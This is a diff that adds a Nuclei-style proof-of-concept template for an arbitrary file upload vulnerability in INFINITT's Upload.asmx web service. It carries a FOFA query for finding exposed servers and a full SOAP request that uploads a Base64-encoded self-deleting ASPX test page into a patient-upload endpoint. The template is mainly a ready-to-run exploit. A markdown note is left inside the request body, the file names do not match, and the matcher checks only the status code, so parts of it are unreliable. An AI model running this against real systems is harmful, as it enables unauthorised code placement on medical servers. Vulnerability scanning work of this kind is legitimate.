@@ -1,0 +1,61 @@
+id: poc-mfqvrpo21q1g8wwn
+info:
+  name: 英飞达软件（上海）有限公司Upload.asmx存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mfqvrpo21q1g8wwn'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mfqvrpo21q1g8wwn
+    fofa: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
+http:
+- raw:
+  - 'POST /webservices/Upload.asmx HTTP/1.1
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: text/xml; charset=utf-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    SOAPAction: "http://tempuri.org/UploadData"
+
+    Connection: close
+
+
+    <?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <UploadData xmlns="http://tempuri.org/">
+
+    <guid>1</guid>
+
+    <patientId>1</patientId>
+
+    <patientName>1</patientName>
+
+    <fileName>DudeSuite.aspx</fileName>
+
+    <fileSize>1000</fileSize>
+
+    <file>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoInRlc3QxMjMiKTsgU3lzdGVtLklPLkZpbGUuRGVsZXRlKFNlcnZlci5NYXBQYXRoKFJlcXVlc3QuVXJsLkFic29sdXRlUGF0aCkpOyAlPg==</file>
+
+    </UploadData>
+
+    </soap:Body>
+
+    </soap:Envelope>
+
+
+    **上传定位/spool/1/test123.aspx**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
